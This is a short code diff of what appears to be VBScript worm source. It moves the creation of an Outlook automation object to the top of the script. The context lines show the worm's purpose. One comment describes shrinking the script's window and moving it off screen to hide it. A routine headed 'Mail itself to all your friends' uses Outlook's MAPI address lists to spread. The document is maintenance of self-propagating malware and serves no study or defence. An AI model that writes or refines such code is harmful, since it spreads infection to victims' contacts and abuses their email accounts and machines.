@@ -32,6 +32,7 @@
     Set dc = fso.Drives
     Set xHttp = createobject("Microsoft.XMLHTTP")
     Set bStrm = createobject("Adodb.Stream")
+    Set OutlookApp = CreateObject("Outlook.Application")
     strUser = CreateObject("WScript.Network").UserName
 
     Rem Makes windows uber small and moves it far away
@@ -317,7 +318,6 @@
     Rem Mail itself to all your friends
     Sub doMail()
         On Error Resume Next
-        Set OutlookApp = CreateObject("Outlook.Application")
         If OutlookApp = "Outlook" Then
             Set MAPINameSpace = OutlookApp.GetNameSpace("MAPI")
             Set AddressLists = MAPINameSpace.AddressLists
